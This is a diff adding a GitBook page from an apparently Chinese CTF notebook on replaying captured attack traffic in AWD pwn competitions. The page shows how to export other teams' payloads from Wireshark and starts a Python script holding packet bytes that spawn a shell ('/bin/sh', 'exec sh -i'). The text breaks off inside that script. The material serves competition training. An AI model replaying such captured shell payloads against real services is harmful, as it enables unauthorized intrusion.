@@ -1,0 +1,1712 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>awdpwn流量转发手动 · Gitbook电子书</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="TTY">
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../evilPatcher_pwn通防/evilPatcher_pwn通防.html" />
+    
+    
+    <link rel="prev" href="../" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../pwn/">
+            
+                <a href="../../pwn/">
+            
+                    
+                    pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../../pwn/pwn基础/">
+            
+                <a href="../../pwn/pwn基础/">
+            
+                    
+                    pwn基础
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../../pwn/pwn基础/gdb使用/gdb使用.html">
+            
+                <a href="../../pwn/pwn基础/gdb使用/gdb使用.html">
+            
+                    
+                    gdb使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../../pwn/pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html">
+            
+                <a href="../../pwn/pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html">
+            
+                    
+                    glibc更换_patchelf方法
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../../pwn/pwn基础/linux系统调用号查询/linux系统调用号查询.html">
+            
+                <a href="../../pwn/pwn基础/linux系统调用号查询/linux系统调用号查询.html">
+            
+                    
+                    linux系统调用号查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4" data-path="../../pwn/pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html">
+            
+                <a href="../../pwn/pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html">
+            
+                    
+                    pwn题编译时的保护选项
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../../pwn/">
+            
+                <a href="../../pwn/">
+            
+                    
+                    fmt
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="../../pwn/fmt/fmt/fmt.html">
+            
+                <a href="../../pwn/fmt/fmt/fmt.html">
+            
+                    
+                    fmt
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2" data-path="../../pwn/fmt/fmtstr模块/fmtstr模块.html">
+            
+                <a href="../../pwn/fmt/fmtstr模块/fmtstr模块.html">
+            
+                    
+                    fmtstr模块
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3" data-path="../../pwn/fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html">
+            
+                <a href="../../pwn/fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html">
+            
+                    
+                    格式化字符串中的占位符特殊用法
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../../pwn/rop/">
+            
+                <a href="../../pwn/rop/">
+            
+                    
+                    rop
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../../pwn/rop/ret2csu/ret2csu.html">
+            
+                <a href="../../pwn/rop/ret2csu/ret2csu.html">
+            
+                    
+                    ret2csu
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.2" data-path="../../pwn/rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html">
+            
+                <a href="../../pwn/rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html">
+            
+                    
+                    通过mmap&mprotect来绕过nx
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.3" data-path="../../pwn/rop/srop/srop.html">
+            
+                <a href="../../pwn/rop/srop/srop.html">
+            
+                    
+                    srop
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.4" data-path="../../pwn/rop/dl_runtime_resolve/dl_runtime_resolve.html">
+            
+                <a href="../../pwn/rop/dl_runtime_resolve/dl_runtime_resolve.html">
+            
+                    
+                    dl_runtime_resolve
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.5" data-path="../../pwn/rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html">
+            
+                <a href="../../pwn/rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html">
+            
+                    
+                    dl_runtime_resolve_64位
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.6" data-path="../../pwn/rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html">
+            
+                <a href="../../pwn/rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html">
+            
+                    
+                    Ret2dlresolvePayload使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../../pwn/heap_related/">
+            
+                <a href="../../pwn/heap_related/">
+            
+                    
+                    heap_related
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../../pwn/heap_related/house_of_botcake/house_of_botcake.html">
+            
+                <a href="../../pwn/heap_related/house_of_botcake/house_of_botcake.html">
+            
+                    
+                    house_of_botcake
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="../../pwn/heap_related/House_of_Einherjar/House_of_Einherjar.html">
+            
+                <a href="../../pwn/heap_related/House_of_Einherjar/House_of_Einherjar.html">
+            
+                    
+                    House_of_Einherjar
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.3" data-path="../../pwn/heap_related/House_Of_Force/House_Of_Force.html">
+            
+                <a href="../../pwn/heap_related/House_Of_Force/House_Of_Force.html">
+            
+                    
+                    House_Of_Force
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.4" data-path="../../pwn/heap_related/House_of_lore/House_of_lore.html">
+            
+                <a href="../../pwn/heap_related/House_of_lore/House_of_lore.html">
+            
+                    
+                    House_of_lore
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.5" data-path="../../pwn/heap_related/House_of_Orange/House_of_Orange.html">
+            
+                <a href="../../pwn/heap_related/House_of_Orange/House_of_Orange.html">
+            
+                    
+                    House_of_Orange
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.6" data-path="../../pwn/heap_related/House_of_storm/House_of_storm.html">
+            
+                <a href="../../pwn/heap_related/House_of_storm/House_of_storm.html">
+            
+                    
+                    House_of_storm
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.7" data-path="../../pwn/heap_related/how2heap学习/how2heap解析.html">
+            
+                <a href="../../pwn/heap_related/how2heap学习/how2heap解析.html">
+            
+                    
+                    how2heap解析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.8" data-path="../../pwn/heap_related/large_bin_attack/large_bin_attack.html">
+            
+                <a href="../../pwn/heap_related/large_bin_attack/large_bin_attack.html">
+            
+                    
+                    large_bin_attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.9" data-path="../../pwn/heap_related/ptmalloc_check/ptmalloc_check.html">
+            
+                <a href="../../pwn/heap_related/ptmalloc_check/ptmalloc_check.html">
+            
+                    
+                    ptmalloc_check
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.10" data-path="../../pwn/heap_related/unlink攻击敏感指针/unlink攻击敏感指针.html">
+            
+                <a href="../../pwn/heap_related/unlink攻击敏感指针/unlink攻击敏感指针.html">
+            
+                    
+                    unlink攻击敏感指针
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.11" data-path="../../pwn/heap_related/unsorted_bin相关攻击/unsorted_bin相关攻击.html">
+            
+                <a href="../../pwn/heap_related/unsorted_bin相关攻击/unsorted_bin相关攻击.html">
+            
+                    
+                    unsorted_bin相关攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.12" data-path="../../pwn/heap_related/_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html">
+            
+                <a href="../../pwn/heap_related/_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html">
+            
+                    
+                    IO_2_1_stdout泄露内存
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../../pwn/FILE_related/">
+            
+                <a href="../../pwn/FILE_related/">
+            
+                    
+                    FILE_related
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="../../pwn/FILE_related/close_free/fog.html">
+            
+                <a href="../../pwn/FILE_related/close_free/fog.html">
+            
+                    
+                    fog
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="../../pwn/FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html">
+            
+                <a href="../../pwn/FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html">
+            
+                    
+                    FILE攻击的一些进阶操作_待补充
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.3" data-path="../../pwn/FILE_related/FILE结构体概述/FILE结构体概述.html">
+            
+                <a href="../../pwn/FILE_related/FILE结构体概述/FILE结构体概述.html">
+            
+                    
+                    FILE结构体概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.4" data-path="../../pwn/FILE_related/FSOP/FSOP.html">
+            
+                <a href="../../pwn/FILE_related/FSOP/FSOP.html">
+            
+                    
+                    FSOP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.5" data-path="../../pwn/FILE_related/vtable伪造/vtable伪造.html">
+            
+                <a href="../../pwn/FILE_related/vtable伪造/vtable伪造.html">
+            
+                    
+                    vtable伪造
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../../pwn/沙箱/">
+            
+                <a href="../../pwn/沙箱/">
+            
+                    
+                    沙箱
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.6.1" data-path="../../pwn/沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html">
+            
+                <a href="../../pwn/沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.27下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.2" data-path="../../pwn/沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html">
+            
+                <a href="../../pwn/沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.29下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.3" data-path="../../pwn/沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
+            
+                <a href="../../pwn/沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.31下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.4" data-path="../../pwn/沙箱/seccomp&ptcl/seccomp&ptcl.html">
+            
+                <a href="../../pwn/沙箱/seccomp&ptcl/seccomp&ptcl.html">
+            
+                    
+                    seccomp&ptcl
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../../arm_pwn/">
+            
+                <a href="../../arm_pwn/">
+            
+                    
+                    arm_pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../../arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html">
+            
+                <a href="../../arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html">
+            
+                    
+                    arm&aarch64汇编
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../../arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
+            
+                <a href="../../arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
+            
+                    
+                    ARMpwn基础环境搭建
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../../arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
+            
+                <a href="../../arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
+            
+                    
+                    树莓派搭建ARM环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../../kernel_pwn/">
+            
+                <a href="../../kernel_pwn/">
+            
+                    
+                    kernel_pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../../kernel_pwn/c文件操作/c文件操作.html">
+            
+                <a href="../../kernel_pwn/c文件操作/c文件操作.html">
+            
+                    
+                    c文件操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../../kernel_pwn/kernel_pwn_rop/kernel_pwn_rop.html">
+            
+                <a href="../../kernel_pwn/kernel_pwn_rop/kernel_pwn_rop.html">
+            
+                    
+                    kernel_pwn_rop
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../../kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.html">
+            
+                <a href="../../kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.html">
+            
+                    
+                    linux_kernel保护机制
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../../kernel_pwn/linux_kernel基础/linux_kernel基础.html">
+            
+                <a href="../../kernel_pwn/linux_kernel基础/linux_kernel基础.html">
+            
+                    
+                    linux_kernel基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="../../kernel_pwn/ropper简单使用/ropper简单使用.html">
+            
+                <a href="../../kernel_pwn/ropper简单使用/ropper简单使用.html">
+            
+                    
+                    ropper简单使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    awd
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.5.1" data-path="awd_pwn流量转发_手动.html">
+            
+                <a href="awd_pwn流量转发_手动.html">
+            
+                    
+                    awdpwn流量转发手动
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../evilPatcher_pwn通防/evilPatcher_pwn通防.html">
+            
+                <a href="../evilPatcher_pwn通防/evilPatcher_pwn通防.html">
+            
+                    
+                    evilPatcher_pwn通防
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../如何在awd中苟活_pwn/如何在awd中苟活_pwn.html">
+            
+                <a href="../如何在awd中苟活_pwn/如何在awd中苟活_pwn.html">
+            
+                    
+                    如何在awd中苟活_pwn
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../../IOT漏洞挖掘/">
+            
+                <a href="../../IOT漏洞挖掘/">
+            
+                    
+                    IOT漏洞挖掘
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/">
+            
+                    
+                    IoT-vulhub学习
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1.1" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html">
+            
+                    
+                    Cisco-CVE-2020-3331
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.2" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html">
+            
+                    
+                    HUAWEI-CVE-2017-17215
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.3" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html">
+            
+                    
+                    Netgear-CVE-2019-20760
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.4" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html">
+            
+                    
+                    Tenda-CVE-2018-16333
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.5" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html">
+            
+                    
+                    Tenda-CVE-2018-5767
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.6" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html">
+            
+                    
+                    Tenda-CVE-2020-10987
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.7" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html">
+            
+                    
+                    TP-Link-CVE-2020-8423
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.8" data-path="../../IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html">
+            
+                <a href="../../IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html">
+            
+                    
+                    VIVOTEK-CVE-2020-10987
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../../密码学/">
+            
+                <a href="../../密码学/">
+            
+                    
+                    密码学
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../../密码学/AES/AES.html">
+            
+                <a href="../../密码学/AES/AES.html">
+            
+                    
+                    AES
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../../密码学/RC4/RC4.html">
+            
+                <a href="../../密码学/RC4/RC4.html">
+            
+                    
+                    RC4
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../../web/">
+            
+                <a href="../../web/">
+            
+                    
+                    web
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.1" data-path="../../web/sql注入/sql注入.html">
+            
+                <a href="../../web/sql注入/sql注入.html">
+            
+                    
+                    sql注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../../机器学习/">
+            
+                <a href="../../机器学习/">
+            
+                    
+                    机器学习
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="../../机器学习/pytorch/pytorch.html">
+            
+                <a href="../../机器学习/pytorch/pytorch.html">
+            
+                    
+                    pytorch
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="../../机器学习/数据处理/数据处理.html">
+            
+                <a href="../../机器学习/数据处理/数据处理.html">
+            
+                    
+                    数据处理
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >awdpwn流量转发手动</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="awd-pwn&#x4E2D;&#x6D41;&#x91CF;&#x8F6C;&#x53D1;&#xFF08;&#x624B;&#x52A8;&#xFF09;">awd pwn&#x4E2D;&#x6D41;&#x91CF;&#x8F6C;&#x53D1;&#xFF08;&#x624B;&#x52A8;&#xFF09;</h1>
+<h3 id="&#x4F8B;1&#xFF1A;ciscn&#x67D0;&#x6B21;awd&#x9898;&#x76EE;-eval">&#x4F8B;1&#xFF1A;ciscn&#x67D0;&#x6B21;awd&#x9898;&#x76EE; eval</h3>
+<h4 id="1&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6252;&#x4E0B;&#x53EF;&#x6267;&#x884C;&#x7A0B;&#x5E8F;">1.&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6252;&#x4E0B;&#x53EF;&#x6267;&#x884C;&#x7A0B;&#x5E8F;</h4>
+<p>  &#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;pwn&#x7684;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x5728;/home/ctf&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x597D;&#x627E;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;out&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x8981;&#x7684;&#x9644;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8FD0;&#x884C;&#x9A8C;&#x8BC1;&#x3002;</p>
+<p><img src="1.png" alt=""></p>
+<h4 id="2&#x7B49;&#x5927;&#x4F6C;&#x4EEC;&#x7684;&#x6D41;&#x91CF;">2.&#x7B49;&#x5927;&#x4F6C;&#x4EEC;&#x7684;&#x6D41;&#x91CF;</h4>
+<p>  &#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;&#x5047;&#x5982;&#x7ED9;&#x6D41;&#x91CF;&#x7684;&#x8BDD;&#x4E5F;&#x4F1A;&#x653E;&#x5728;ctf&#x76EE;&#x5F55;&#x4E0B;&#x3002;</p>
+<p><img src="2.png" alt=""></p>
+<p>  &#x8FD9;&#x4E2A;&#x662F;&#x5F53;&#x65F6;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x62C9;&#x4E0B;&#x6765;&#x7684;&#x6D41;&#x91CF;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FFD;&#x8E2A;TCP&#x6D41;&#x6765;&#x770B;&#x4EBA;&#x5BB6;&#x7684;payload&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x6D41;&#x91CF;&#x7684;&#x6700;&#x540E;&#x6709;&#x8FD9;&#x79CD;cat flag&#x7684;shell&#x547D;&#x4EE4;&#x57FA;&#x672C;&#x4E0A;&#x5C31;&#x662F;&#x80FD;&#x591F;&#x6210;&#x529F;&#x653B;&#x51FB;&#x7684;&#x6D41;&#x91CF;&#x4E86;&#x3002;</p>
+<p>  &#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;&#x5047;&#x5982;&#x7A0B;&#x5E8F;&#x4E0D;&#x9700;&#x8981;&#x6CC4;&#x9732;&#x5730;&#x5740;&#xFF0C;&#x4E00;&#x6A21;&#x4E00;&#x6837;&#x7684;&#x6D41;&#x91CF;&#x6253;&#x8FC7;&#x53BB;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x6210;&#x529F;&#x7684;&#x3002;</p>
+<p>  wireshark&#x662F;&#x53EF;&#x4EE5;&#x628A;payload&#x5BFC;&#x51FA;&#x4E3A;c&#x8BED;&#x8A00;&#x6570;&#x7EC4;&#x5F62;&#x5F0F;&#x7684;&#x3002;</p>
+<p><img src="3.png" alt=""></p>
+<p>&#x90A3;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5199;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x628A;C&#x8BED;&#x8A00;&#x7684;&#x6570;&#x7EC4;&#x8F6C;&#x5316;&#x6210;python&#x91CC;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x7136;&#x540E;&#x4E00;&#x6A21;&#x4E00;&#x6837;&#x53D1;&#x4E00;&#x904D;&#x8FC7;&#x53BB;&#x5C31;&#x884C;&#x4E86;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x5199;&#x4E86;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x8F6C;&#x5316;&#x811A;&#x672C;</p>
+<p>strip.py</p>
+<pre><code class="lang-python">a = <span class="hljs-string">&apos;&apos;&apos;
+char peer0_0[] = { /* Packet 28 */
+0x31, 0x33, 0x0a };
+char peer0_1[] = { /* Packet 30 */
+0x30, 0x00, 0x07, 0x00, 0x2f, 0x62, 0x69, 0x6e, 
+0x2f, 0x73, 0x68, 0x33, 0x00 };
+char peer0_2[] = { /* Packet 31 */
+0x65, 0x78, 0x65, 0x63, 0x20, 0x73, 0x68, 0x20, 
+0x2d, 0x69, 0x0a };
+char peer0_3[] = { /* Packet 32 */
+0x74, 0x72, 0x61, 0x70, 0x20, 0x22, 0x22, 0x20, 
+0x31, 0x20, 0x32, 0x20, 0x33, 0x20, 0x34, 0x20, 
+0x35, 0x20, 0x36, 0x20, 0x37, 0x20, 0x38, 0x20, 
+0x39, 0x20, 0x31, 0x34, 0x20, 0x31, 0x35, 0x20, 
